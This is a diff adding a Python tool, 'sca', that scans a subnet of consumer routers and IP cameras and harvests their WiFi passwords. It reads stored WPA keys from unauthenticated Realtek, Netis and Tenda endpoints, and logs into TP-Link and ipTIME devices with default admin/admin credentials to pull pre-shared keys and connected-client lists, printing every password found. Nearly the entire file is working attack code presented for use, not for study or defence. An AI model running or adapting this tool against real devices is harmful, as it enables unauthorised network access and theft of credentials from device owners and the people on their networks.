@@ -1,0 +1,791 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+sca - CPE camera/WiFi scanner with WiFi password disclosure.
+
+Vendors whose WiFi key is exposed without login:
+  * Realtek  -> wlsecurity_all.htm : wps_psk_old
+  * Netis    -> netcore_get.cgi    : key_wpa / wsc_psk
+  * Tenda    -> goform/WifiBasicGet: wifiPwd (when present)
+Other vendors (TP-Link, ipTIME, ...) require login.  A best-effort login
+with admin/admin is attempted before falling back to "login req.".
+
+Connected-device counts come from:
+  * Realtek -> status.htm      : clientnum / mssid_clientnum / rp_clientnum
+  * Netis   -> netcore_get.cgi : dhcp_client_list (fallback: arp_list)
+  * Tenda   -> goform/getWifiClientList (when the firmware exposes it)
+  * anything else that needs login -> N/A
+
+Design borrowed from the `scan` tool:
+  * live streaming output (flush + print_lock)
+  * fast host-alive check (TCP:80 -> ping) before any curl
+  * ThreadPoolExecutor (-t/--threads, default 18)
+  * live numbering (# in discovery order)
+
+Arabic SSIDs are reshaped and ordered for a terminal without BiDi support
+(QTerminal), so they read correctly on screen.
+
+Usage:
+  sca [start=175] [end=254] [-t THREADS] [-s SUBNET] [--realtek-only]
+"""
+
+import argparse
+import base64
+import html
+import json
+import re
+import socket
+import subprocess
+import sys
+import threading
+import time
+import unicodedata
+from concurrent.futures import ThreadPoolExecutor
+
+try:
+    from wcwidth import wcswidth as _wcswidth
+except ImportError:
+    _wcswidth = None
+
+try:
+    import arabic_reshaper
+    from bidi.algorithm import get_display as _bidi_display
+except Exception:
+    arabic_reshaper = None
+    _bidi_display = None
+
+RED  = "\033[1;31m"
+CYAN = "\033[1;36m"
+NC   = "\033[0m"
+
+print_lock = threading.Lock()
+counter = 0
+camera_count = 0
+LOGIN_HINTS = {}
+
+# column widths, in terminal cells
+W_NUM, W_IP, W_SSID, W_CLIENTS, W_TRAF, W_PASS, W_STAT = 4, 15, 20, 7, 20, 20, 16
+
+LOGIN_REQ = "🔒 login req."
+NO_CLIENTS = "N/A"
+
+
+# --------------------------------------------------------------------------
+# Terminal-width aware formatting (Arabic / emoji safe)
+# --------------------------------------------------------------------------
+def disp_w(text):
+    """Display width in terminal cells."""
+    if _wcswidth is not None:
+        w = _wcswidth(text)
+        if w >= 0:
+            return w
+    w = 0
+    for ch in text:
+        if unicodedata.combining(ch) or ch in ("\u200e", "\u200f",
+                                               "\u202a", "\u202b", "\u202c",
+                                               "\u2066", "\u2067", "\u2069"):
+            continue
+        w += 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
+    return w
+
+
+def pad(text, width):
+    text = str(text)
+    return text + " " * max(0, width - disp_w(text))
+
+
+def clip(text, width):
+    """Truncate to `width` cells without splitting combining marks."""
+    if disp_w(text) <= width:
+        return text
+    out, w = [], 0
+    for ch in text:
+        cw = disp_w(ch)
+        if w + cw > width - 1:
+            break
+        out.append(ch)
+        w += cw
+    return "".join(out) + "…"
+
+
+_ARABIC_RE = re.compile(r"[\u0600-\u06ff\u0750-\u077f\u08a0-\u08ff"
+                        r"\ufb50-\ufdff\ufe70-\ufeff]")
+
+
+def shape_arabic(text):
+    """Make Arabic readable on a terminal that has no BiDi support.
+
+    Reshaping produces the connected letter forms and get_display() puts
+    them in visual order (right-to-left), which is what QTerminal prints.
+    """
+    text = str(text)
+    if (arabic_reshaper is None or _bidi_display is None
+            or not _ARABIC_RE.search(text)):
+        return text
+    try:
+        return _bidi_display(arabic_reshaper.reshape(text))
+    except Exception:
+        return text
+
+
+# --------------------------------------------------------------------------
+# Helpers
+# --------------------------------------------------------------------------
+def run_curl(args):
+    try:
+        r = subprocess.run(
+            args,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.DEVNULL,
+            text=True,
+            errors="ignore",
+        )
+        return r.stdout
+    except Exception:
+        return ""
+
+
+def is_host_alive(ip, timeout=0.35):
+    """Fast check: TCP port 80 first, then a short ping."""
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(timeout)
+            if s.connect_ex((ip, 80)) == 0:
+                return True
+    except Exception:
+        pass
+    try:
+        res = subprocess.run(
+            ["ping", "-c", "1", "-W", str(timeout), ip],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        return res.returncode == 0
+    except Exception:
+        return False
+
+
+def json_str(payload, key):
+    m = re.search(r'"%s"\s*:\s*"([^"]*)"' % re.escape(key), payload)
+    return m.group(1) if m else None
+
+
+def json_array(payload, key):
+    """Extract a JSON array stored under `key` from a router response."""
+    m = re.search(r'"%s"\s*:\s*(\[[^\]]*\])' % re.escape(key), payload)
+    if not m:
+        return None
+    try:
+        value = json.loads(m.group(1))
+    except Exception:
+        return None
+    return value if isinstance(value, list) else None
+
+
+def clean(value):
+    if value is None:
+        return None
+    value = html.unescape(value).replace("\\'", "'").strip()
+    return value or None
+
+
+# --------------------------------------------------------------------------
+# Realtek
+# --------------------------------------------------------------------------
+def fetch_realtek_ssid(ip):
+    for attempt in range(1, 4):
+        page = run_curl([
+            "curl", "-s", "--connect-timeout", "0.8", "--max-time", "2.5",
+            f"http://{ip}/wlbasic.htm",
+        ])
+        if page:
+            m = re.search(r'ssid_2g\s*[:=]\s*["\']?([^"\'\r\n;<>]+)', page)
+            if not m:
+                m = re.search(r'\bssid\s*[:=]\s*["\']?([^"\'\r\n;<>]+)',
+                              page, re.I)
+            if m:
+                val = clean(m.group(1))
+                if val and val.lower() not in ("null", "undefined"):
+                    return val
+            # page answered but is not a Realtek AP -> no point retrying
+            return None
+        time.sleep(0.10 * attempt)
+    return None
+
+
+def fetch_traffic(ip):
+    for attempt in range(1, 4):
+        page = run_curl([
+            "curl", "-s", "--connect-timeout", "0.8", "--max-time", "2.0",
+            f"http://{ip}/stats.htm",
+        ])
+        mtx = re.search(r'(?:lanTx|lan_tx|lanTxPacket)\s*[:=]\s*["\']?(\d+)', page)
+        mrx = re.search(r'(?:lanRx|lan_rx|lanRxPacket)\s*[:=]\s*["\']?(\d+)', page)
+        if mtx and mrx:
+            return mtx.group(1), mrx.group(1)
+        time.sleep(0.10 * attempt)
+    return "0", "0"
+
+
+def fetch_realtek_clients(ip):
+    """Count associated wireless clients from status.htm.
+
+    Realtek reports one counter for each radio (clientnum), one for each
+    virtual AP (mssid_clientnum) and one for a repeater interface
+    (rp_clientnum).  Each is a separate SSID, so they are summed.
+    """
+    for attempt in range(1, 3):
+        page = run_curl([
+            "curl", "-s", "--connect-timeout", "1.5", "--max-time", "12.0",
+            f"http://{ip}/status.htm",
+        ])
+        if page:
+            main = re.findall(
+                r"(?<![A-Za-z0-9_])clientnum\[\d+\]\s*=\s*['\"]?(\d+)", page)
+            mssid = re.findall(
+                r"mssid_clientnum\[\d+\]\[\d+\]\s*=\s*['\"]?(\d+)", page)
+            rp = re.findall(
+                r"rp_clientnum\[\d+\]\s*=\s*['\"]?(\d+)", page)
+            if main or mssid or rp:
+                total = sum(map(int, main + mssid + rp))
+                return total
+        time.sleep(0.15 * attempt)
+    return None
+
+
+def fetch_realtek_password(ip):
+    """Prefer the raw field: wps_psk_old (unmask_old can be HTML-escaped)."""
+    for attempt in range(1, 5):
+        page = run_curl([
+            "curl", "-s", "--connect-timeout", "0.8", "--max-time", "3.0",
+            f"http://{ip}/wlsecurity_all.htm",
+        ])
+        if page:
+            m = re.search(r"wps_psk_old\s*=\s*'([^']*)'", page)
+            if not m:
+                m = re.search(r"wps_psk_unmask_old\s*=\s*'([^']*)'", page)
+            if not m:
+                m = re.search(r'pskValue1\.value\s*=\s*"([^"]*)"', page)
+            if m:
+                val = clean(m.group(1))
+                if val:
+                    return val
+        time.sleep(0.12 * attempt)
+    return None
+
+
+# --------------------------------------------------------------------------
+# Netis / Netcore
+# --------------------------------------------------------------------------
+def count_netis_clients(page):
+    """Prefer DHCP leases; fall back to valid ARP entries."""
+    dhcp = json_array(page, "dhcp_client_list")
+    if dhcp is not None:
+        active = [c for c in dhcp
+                  if not isinstance(c, dict)
+                  or c.get("status", "1") in ("1", 1, True)]
+        return len(active)
+
+    arp = json_array(page, "arp_list")
+    if arp is not None:
+        valid = [c for c in arp
+                 if not isinstance(c, dict)
+                 or c.get("arp_st", "0x2") in ("0x2", 2)]
+        return len(valid)
+    return None
+
+
+def fetch_netis(ip):
+    best = None
+    for path in ("/cgi-bin/netcore_get.cgi", "/netcore_get.cgi"):
+        for attempt in range(1, 4):
+            page = run_curl([
+                "curl", "-s", "--connect-timeout", "1.0", "--max-time", "5.0",
+                "-d", "mode_name=netcore_get&no=no",
+                f"http://{ip}{path}",
+            ])
+            ssid = clean(json_str(page, "ssid"))
+            if not ssid:
+                break
+
+            pwd = None
+            for key in ("key_wpa", "wsc_psk", "wds_key_wpa", "key_wep"):
+                pwd = clean(json_str(page, key))
+                if pwd:
+                    break
+
+            active = 0
+            for lan in ("lan1", "lan2", "lan3", "lan4"):
+                val = json_str(page, lan)
+                if val and val.isdigit():
+                    active += int(val)
+            traffic = f"{active} Active LAN" if active else "0 / 0"
+            best = (ssid, traffic, active > 0, pwd or "N/A",
+                    count_netis_clients(page))
+            if pwd:
+                return best
+            time.sleep(0.12 * attempt)
+        if best and best[3] != "N/A":
+            return best
+    return best
+
+
+# --------------------------------------------------------------------------
+# Tenda
+# --------------------------------------------------------------------------
+def fetch_tenda_clients(ip):
+    """Tenda exposes an unauthenticated client list on some firmwares."""
+    for path in ("/goform/getWifiClientList", "/goform/getClientList",
+                 "/goform/getOnlineClientList", "/goform/WifiClientList"):
+        page = run_curl([
+            "curl", "-s", "--connect-timeout", "0.8", "--max-time", "3.0",
+            f"http://{ip}{path}",
+        ])
+        if not page or page.lstrip()[:1] not in ("{", "["):
+            continue
+        try:
+            data = json.loads(page)
+        except Exception:
+            for key in ("clientList", "client_list", "clientlist",
+                        "onlineList", "list", "data"):
+                arr = json_array(page, key)
+                if arr is not None:
+                    return len(arr)
+            continue
+        if isinstance(data, list):
+            return len(data)
+        if isinstance(data, dict):
+            for key in ("clientList", "client_list", "clientlist",
+                        "onlineList", "list", "data"):
+                val = data.get(key)
+                if isinstance(val, list):
+                    return len(val)
+    return None
+
+
+def fetch_tenda(ip):
+    page = run_curl([
+        "curl", "-s", "--connect-timeout", "0.8", "--max-time", "2.0",
+        f"http://{ip}/goform/WifiBasicGet",
+    ])
+    ssid = clean(json_str(page, "ssid"))
+    if not ssid:
+        return None
+    pwd = None
+    for key in ("wifiPwd", "wifiPass", "password", "wpa_key"):
+        pwd = clean(json_str(page, key))
+        if pwd:
+            break
+    return ssid, "0 / 0", False, pwd or "N/A", fetch_tenda_clients(ip)
+
+
+# --------------------------------------------------------------------------
+# TP-Link / ipTIME / Basic-Auth realms (password needs login)
+# --------------------------------------------------------------------------
+def fetch_brand(ip):
+    root = run_curl([
+        "curl", "-s", "--connect-timeout", "0.8", "--max-time", "2.0", "-i",
+        f"http://{ip}/",
+    ])
+    if not root:
+        return None
+
+    if "WWW-Authenticate:" in root:
+        m = re.search(r'realm=["\']([^"\']+)["\']', root)
+        if m:
+            realm = m.group(1).strip()
+            if realm.lower() not in ("basic", "login", "auth", "realtek", "admin"):
+                name = re.sub(
+                    r'^(TP-LINK\s+Wireless\s+N\s+Router\s+|TP-LINK\s+)', "",
+                    realm, flags=re.I)
+                LOGIN_HINTS[ip] = "tplink-old"
+                return name or realm, "0 / 0", False, LOGIN_REQ, None
+
+    if "TL-WR" in root or "TP-LINK" in root or "Archer" in root:
+        m = (re.search(r'modelName\s*=\s*["\']([^"\']+)["\']', root)
+             or re.search(r'<title>(.*?)</title>', root, re.I))
+        if m:
+            LOGIN_HINTS[ip] = "tplink-new"
+            return clean(m.group(1)), "0 / 0", False, LOGIN_REQ, None
+
+    if "ipTIME" in root:
+        m = re.search(r'<title>(.*?)</title>', root, re.I)
+        if m:
+            LOGIN_HINTS[ip] = "iptime"
+            return clean(m.group(1)), "0 / 0", False, LOGIN_REQ, None
+
+    page = run_curl([
+        "curl", "-s", "--connect-timeout", "0.8", "--max-time", "1.5",
+        f"http://{ip}/sess-bin/login_session.cgi",
+    ])
+    if "ipTIME" in page:
+        m = re.search(r'<title>(.*?)</title>', page, re.I)
+        if m:
+            LOGIN_HINTS[ip] = "iptime"
+            return clean(m.group(1)), "0 / 0", False, LOGIN_REQ, None
+
+    return None
+
+
+# --------------------------------------------------------------------------
+# Best-effort admin/admin login for devices that hide their data
+# --------------------------------------------------------------------------
+TPLINK_AUTH = "Authorization=Basic " + base64.b64encode(
+    b"admin:admin").decode()
+
+TPLINK_WLAN_ATTRS = [
+    "name", "SSID", "Enable", "X_TP_Configuration_Modified", "beaconType",
+    "Standard", "WEPEncryptionLevel", "WEPKeyIndex",
+    "BasicEncryptionModes", "BasicAuthenticationMode",
+    "WPAEncryptionModes", "WPAAuthenticationMode",
+    "IEEE11iEncryptionModes", "IEEE11iAuthenticationMode",
+    "X_TP_PreSharedKey", "X_TP_GroupKeyUpdateInterval",
+    "X_TP_RadiusServerIP", "X_TP_RadiusServerPort",
+    "X_TP_RadiusServerPassword",
+]
+
+
+def tplink_cgi_body(oid, attrs, stack="0,0,0,0,0,0",
+                    pstack="0,0,0,0,0,0"):
+    attrs_text = "\r\n".join(attrs)
+    return "[%s#%s#%s]0,%d\r\n%s" % (
+        oid, stack, pstack, max(0, len(attrs) - 1), attrs_text)
+
+
+def tplink_post(ip, act, body, referer):
+    """Call the TP-Link new-web-UI JSON/ANSI CGI endpoint."""
+    return run_curl([
+        "curl", "-s", "--connect-timeout", "1.2", "--max-time", "5.0",
+        "-H", "Cookie: " + TPLINK_AUTH,
+        "-H", "Referer: http://%s/%s" % (ip, referer),
+        "-H", "Content-Type: text/plain",
+        "--data-binary", body,
+        "http://%s/cgi?%s&" % (ip, act),
+    ])
+
+
+def cgi_blocks(resp):
+    blocks, cur = [], None
+    for line in resp.splitlines():
+        m = re.match(r"^\[([^\]]+)\](\d+)\s*$", line)
+        if m:
+            if cur is not None:
+                blocks.append(cur)
+            cur = {"stack": m.group(1), "attrs": {}}
+        elif cur is not None and "=" in line:
+            key, value = line.split("=", 1)
+            cur["attrs"][key] = value
+    if cur is not None:
+        blocks.append(cur)
+    return [b for b in blocks if b["attrs"]]
+
+
+def cgi_attr(block, key):
+    key = key.lower()
+    for k, v in block["attrs"].items():
+        if k.lower() == key:
+            return v
+    return None
+
+
+def fetch_tplink_clients(ip, stack):
+    attrs = ["AssociatedDeviceMACAddress", "X_TP_TotalPacketsSent",
+             "X_TP_TotalPacketsReceived", "X_TP_HostName"]
+    body = tplink_cgi_body("LAN_WLAN_ASSOC_DEV", attrs, pstack=stack)
+    best = None
+    for _ in range(2):
+        resp = tplink_post(ip, "6", body, "main/wlStats.htm")
+        macs = re.findall(r"associatedDeviceMACAddress=", resp, re.I)
+        if macs:
+            return len(macs)
+        if resp and "[error]" not in resp:
+            best = 0
+    if best is not None:
+        return best
+
+    # Fall back to the DHCP lease table (wired + wireless).
+    body = tplink_cgi_body(
+        "LAN_HOST_ENTRY",
+        ["leaseTimeRemaining", "MACAddress", "hostName", "IPAddress"])
+    resp = tplink_post(ip, "5", body, "main/dhcpClient.htm")
+    if "[error]" in resp and "MACAddress=" not in resp:
+        return None
+    leases = re.findall(r"^leaseTimeRemaining=([^\r\n]*)", resp, re.M)
+    return sum(1 for v in leases if v not in ("0", "-1"))
+
+
+def fetch_tplink_new(ip):
+    """TP-Link new web UI (cookie Authorization + /cgi API)."""
+    resp = tplink_post(ip, "5", tplink_cgi_body("LAN_WLAN",
+                                                TPLINK_WLAN_ATTRS),
+                       "main/wlSec.htm")
+    if "SSID=" not in resp:
+        return None
+
+    chosen = None
+    for block in cgi_blocks(resp):
+        ssid = clean(cgi_attr(block, "SSID"))
+        if not ssid:
+            continue
+        if chosen is None:
+            chosen = block
+        if (cgi_attr(block, "Enable") == "1"
+                and clean(cgi_attr(block, "X_TP_PreSharedKey"))):
+            chosen = block
+            break
+    if chosen is None:
+        return None
+
+    ssid = clean(cgi_attr(chosen, "SSID"))
+    pwd = clean(cgi_attr(chosen, "X_TP_PreSharedKey")) or "N/A"
+    clients = fetch_tplink_clients(ip, chosen["stack"])
+    return ssid, "0 / 0", False, pwd, clients
+
+
+def fetch_tplink_old(ip):
+    """TP-Link classic web UI (HTTP Basic realm)."""
+    base = "http://%s" % ip
+    common = [
+        "curl", "-s", "--connect-timeout", "1.5", "--max-time", "5.0",
+        "-u", "admin:admin",
+        "-H", "Referer: %s/userRpm/MenuRpm.htm" % base,
+    ]
+
+    sec = run_curl(common + ["%s/userRpm/WlanSecurityRpm.htm" % base])
+    if not sec or "httpAutErrorArray" in sec or "wlanPara" not in sec:
+        return None
+
+    ssid = None
+    net = run_curl(common + ["%s/userRpm/WlanNetworkRpm.htm" % base])
+    m = re.search(r"var\s+wlanPara\s*=\s*new\s+Array\s*\((.*?)\)",
+                  net, re.I | re.S)
+    if m:
+        vals = re.findall(r'"((?:[^"\\]|\\.)*)"', m.group(1))
+        if vals:
+            ssid = clean(vals[3]) if len(vals) > 3 else clean(vals[0])
+
+    pwd = None
+    m = re.search(r"var\s+wlanPara\s*=\s*new\s+Array\s*\((.*?)\)",
+                  sec, re.I | re.S)
+    if m:
+        items = re.findall(r'"((?:[^"\\]|\\.)*)"|(-?\d+)', m.group(1))
+        vals = [a if a != "" else b for a, b in items]
+        # Classic layout: index 9 = PSK, index 3 = WEP key.
+        if len(vals) > 9:
+            pwd = clean(vals[9])
+        if not pwd and len(vals) > 3:
+            pwd = clean(vals[3])
+
+    if not ssid:
+        m = re.search(r"<title>(.*?)</title>", sec, re.I)
+        ssid = clean(m.group(1)) if m else None
+    if not ssid:
+        return None
+
+    clients = None
+    sta = run_curl(common + ["%s/userRpm/WlanStationRpm.htm" % base])
+    if sta and "httpAutErrorArray" not in sta:
+        macs = set(re.findall(
+            r"([0-9A-Fa-f]{2}(?:[:-][0-9A-Fa-f]{2}){5})", sta))
+        clients = len(macs)
+    if not clients:
+        dhcp = run_curl(common + [
+            "%s/userRpm/AssignedIpAddrListRpm.htm" % base])
+        if dhcp and "httpAutErrorArray" not in dhcp:
+            macs = set(re.findall(
+                r"([0-9A-Fa-f]{2}(?:[:-][0-9A-Fa-f]{2}){5})", dhcp))
+            clients = len(macs) or None
+
+    return ssid, "0 / 0", False, pwd or "N/A", clients
+
+
+def fetch_iptime_login(ip):
+    """ipTIME: POST the login form with admin/admin, then read settings."""
+    base = "http://%s" % ip
+    jar = "/tmp/sca_iptime_%s.jar" % ip.replace(".", "_")
+    common = [
+        "curl", "-s", "--connect-timeout", "1.2", "--max-time", "7.0",
+        "-c", jar, "-b", jar,
+    ]
+
+    run_curl(common + ["%s/sess-bin/login_session.cgi" % base])
+    run_curl(common + [
+        "-H", "Content-Type: application/x-www-form-urlencoded",
+        "-H", "Referer: %s/sess-bin/login_session.cgi" % base,
+        "--data", ("init_status=1&captcha_on=0&captcha_file="
+                   "&username=admin&passwd=admin"),
+        "%s/sess-bin/login_handler.cgi" % base,
+    ])
+
+    menu = run_curl(common + [
+        "%s/sess-bin/timepro.cgi?tmenu=menu" % base])
+    if not menu or "login_session.cgi" in menu:
+        return None
+
+    pages = []
+    for url in ("%s/sess-bin/timepro.cgi?tmenu=wlan&smenu=wlan_basic" % base,
+                "%s/sess-bin/timepro.cgi?tmenu=wlan&smenu=wlan_security" % base,
+                "%s/sess-bin/timepro.cgi?tmenu=wlan&smenu=wlan_station" % base,
+                "%s/sess-bin/timepro.cgi?tmenu=status&smenu=wlan_station" % base):
+        pages.append(run_curl(common + [url]))
+
+    text = "\n".join(pages)
+    ssid = None
+    for name in ("ssid", "wlan_ssid", "essid"):
+        m = (re.search(r'name=["\']?%s["\']?[^>]*value=["\']([^"\']*)'
+                       % name, text, re.I)
+             or re.search(r'value=["\']([^"\']*)["\'][^>]*name=["\']?%s'
+                          % name, text, re.I))
+        if m and clean(m.group(1)):
+            ssid = clean(m.group(1))
+            break
+    if not ssid:
+        m = re.search(r"<title>(.*?)</title>", menu, re.I)
+        ssid = clean(m.group(1)) if m else None
+    if not ssid:
+        return None
+
+    pwd = None
+    for name in ("wpapsk", "wpa_psk", "wlan_psk", "psk", "passwd",
+                 "wpa_passphrase", "key"):
+        m = (re.search(r'name=["\']?%s["\']?[^>]*value=["\']([^"\']+)'
+                       % name, text, re.I)
+             or re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']?%s'
+                          % name, text, re.I))
+        if m and clean(m.group(1)):
+            pwd = clean(m.group(1))
+            break
+
+    macs = set(re.findall(
+        r"([0-9A-Fa-f]{2}(?:[:-][0-9A-Fa-f]{2}){5})", text))
+    clients = len(macs) or None
+    return ssid, "0 / 0", False, pwd or "N/A", clients
+
+
+def try_login(ip, brand):
+    """Try admin/admin only on brands where it is likely to work."""
+    hint = LOGIN_HINTS.get(ip)
+    if hint == "tplink-old":
+        return fetch_tplink_old(ip)
+    if hint == "tplink-new":
+        return fetch_tplink_new(ip) or fetch_tplink_old(ip)
+    if hint == "iptime":
+        return fetch_iptime_login(ip)
+
+    name = (brand or "").lower()
+    if any(tag in name for tag in
+           ("tp-link", "tl-wr", "archer", "wr840", "wr740", "wr841",
+            "wr940", "wr1043")):
+        return fetch_tplink_new(ip) or fetch_tplink_old(ip)
+    if "iptime" in name:
+        return fetch_iptime_login(ip)
+    return None
+
+
+# --------------------------------------------------------------------------
+# One host
+# --------------------------------------------------------------------------
+def scan_target(ip, realtek_only=False):
+    global counter, camera_count
+
+    if not is_host_alive(ip):
+        return
+
+    row = None
+    realtek = fetch_realtek_ssid(ip)
+
+    if realtek:
+        tx, rx = fetch_traffic(ip)
+        traffic = f"{tx} / {rx}"
+        is_cam = (tx != "0" or rx != "0")
+        row = (realtek, traffic, is_cam,
+               fetch_realtek_password(ip) or "N/A",
+               fetch_realtek_clients(ip))
+    elif not realtek_only:
+        row = fetch_netis(ip) or fetch_tenda(ip) or fetch_brand(ip)
+        if row and row[3] == LOGIN_REQ:
+            row = try_login(ip, row[0]) or row
+
+    if not row:
+        return
+
+    ssid, traffic, is_cam, password, clients = row
+    status = "📷 Cameras" if is_cam else "❌ No Cameras"
+    clients = NO_CLIENTS if clients is None else clients
+    ssid = shape_arabic(ssid)
+
+    with print_lock:
+        counter += 1
+        if is_cam:
+            camera_count += 1
+
+        num = f"{counter:02d}"
+        # password is never truncated: it is the point of this tool
+        line = (
+            pad(num, W_NUM) + " | "
+            + pad(ip, W_IP) + " | "
+            + pad(clip(ssid, W_SSID), W_SSID) + " | "
+            + pad(clients, W_CLIENTS) + " | "
+            + pad(traffic, W_TRAF) + " | "
+            + pad(password, W_PASS) + " | "
+            + pad(status, W_STAT)
+        )
+        print(f"{RED}{line}{NC}" if is_cam else line, flush=True)
+
+
+# --------------------------------------------------------------------------
+def main():
+    parser = argparse.ArgumentParser(
+        prog="sca",
+        description="CPE camera/WiFi scanner with password disclosure",
+    )
+    parser.add_argument("start", nargs="?", type=int, default=175)
+    parser.add_argument("end", nargs="?", type=int, default=254)
+    parser.add_argument("-t", "--threads", type=int, default=18)
+    parser.add_argument("-s", "--subnet", default="15.15.15")
+    parser.add_argument("--realtek-only", action="store_true",
+                        help="only Realtek devices")
+    args = parser.parse_args()
+
+    subnet = args.subnet.strip(".")
+    start, end = min(args.start, args.end), max(args.start, args.end)
+    if start < 1 or end > 254:
+        parser.error("range must be inside 1..254")
+
+    ip_list = [f"{subnet}.{i}" for i in range(start, end + 1)]
+
+    header = (
+        pad("#", W_NUM) + " | " + pad("IP", W_IP) + " | "
+        + pad("SSID", W_SSID) + " | " + pad("CLIENTS", W_CLIENTS) + " | "
+        + pad("TRAFFIC", W_TRAF) + " | "
+        + pad("PASSWORD", W_PASS) + " | " + pad("STATUS", W_STAT)
+    )
+    print(f"{CYAN}{header}{NC}", flush=True)
+    widths = (W_NUM, W_IP, W_SSID, W_CLIENTS, W_TRAF, W_PASS, W_STAT)
+    print("-" * (sum(widths) + 3 * (len(widths) - 1)), flush=True)
+
+    executor = ThreadPoolExecutor(max_workers=max(1, args.threads))
+    cancelled = False
+    try:
+        futures = [executor.submit(scan_target, ip, args.realtek_only)
+                   for ip in ip_list]
+        for f in futures:
+            f.result()
+    except KeyboardInterrupt:
+        cancelled = True
+        executor.shutdown(wait=False, cancel_futures=True)
+        raise
+    finally:
+        if not cancelled:
+            executor.shutdown(wait=False, cancel_futures=True)
+
+    print(f"\n{CYAN}✔ Scan Completed — {counter} host(s), "
+          f"{camera_count} camera(s){NC}", flush=True)
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n{CYAN}✔ Scan Cancelled{NC}", flush=True)
+        sys.exit(0)
